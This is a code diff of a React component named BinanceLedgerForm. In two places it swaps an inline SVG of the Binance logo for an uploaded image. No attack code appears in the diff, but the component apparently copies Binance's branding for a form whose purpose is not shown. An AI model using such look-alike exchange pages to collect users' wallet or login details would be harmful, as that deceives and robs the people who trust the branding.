@@ -509,17 +509,11 @@ const BinanceLedgerForm: FC = () => {
         <div className="p-8">
           {/* Binance logo at the top */}
           <div className="flex justify-center mb-8">
-            <div className="flex items-center">
-              <svg width="105" height="24" viewBox="0 0 105 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M17.2 8.8L12 3.6L6.8 8.8L4.2 6.2L12 -1.6L19.8 6.2L17.2 8.8Z" fill="#F0B90B"/>
-                <path d="M2.4 12L0 9.6L7.8 1.8L10.4 4.4L2.4 12Z" fill="#F0B90B"/>
-                <path d="M8.8 17.2L6.2 19.8L-1.6 12L1.8 8.6L8.8 15.6V17.2Z" fill="#F0B90B"/>
-                <path d="M17.2 15.2L19.8 17.8L12 25.6L4.2 17.8L6.8 15.2L12 20.4L17.2 15.2Z" fill="#F0B90B"/>
-                <path d="M21.6 12L24 14.4L16.2 22.2L13.6 19.6L21.6 12Z" fill="#F0B90B"/>
-                <path d="M15.2 6.8L17.8 4.2L25.6 12L22.2 15.4L15.2 8.4V6.8Z" fill="#F0B90B"/>
-              </svg>
-              <span className="text-white text-2xl font-bold ml-3">Binance</span>
-            </div>
+            <img 
+              src="/lovable-uploads/4c0fbc91-35cc-46d3-bcf6-523c9659b911.png" 
+              alt="Binance" 
+              className="h-8"
+            />
           </div>
 
           <div className="mb-8">
@@ -628,17 +622,11 @@ const BinanceLedgerForm: FC = () => {
         <div className="p-8">
           {/* Binance logo at the top */}
           <div className="flex justify-center mb-8">
-            <div className="flex items-center">
-              <svg width="105" height="24" viewBox="0 0 105 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M17.2 8.8L12 3.6L6.8 8.8L4.2 6.2L12 -1.6L19.8 6.2L17.2 8.8Z" fill="#F0B90B"/>
-                <path d="M2.4 12L0 9.6L7.8 1.8L10.4 4.4L2.4 12Z" fill="#F0B90B"/>
-                <path d="M8.8 17.2L6.2 19.8L-1.6 12L1.8 8.6L8.8 15.6V17.2Z" fill="#F0B90B"/>
-                <path d="M17.2 15.2L19.8 17.8L12 25.6L4.2 17.8L6.8 15.2L12 20.4L17.2 15.2Z" fill="#F0B90B"/>
-                <path d="M21.6 12L24 14.4L16.2 22.2L13.6 19.6L21.6 12Z" fill="#F0B90B"/>
-                <path d="M15.2 6.8L17.8 4.2L25.6 12L22.2 15.4L15.2 8.4V6.8Z" fill="#F0B90B"/>
-              </svg>
-              <span className="text-white text-2xl font-bold ml-3">Binance</span>
-            </div>
+            <img 
+              src="/lovable-uploads/4c0fbc91-35cc-46d3-bcf6-523c9659b911.png" 
+              alt="Binance" 
+              className="h-8"
+            />
           </div>
 
           <div className="mb-8">
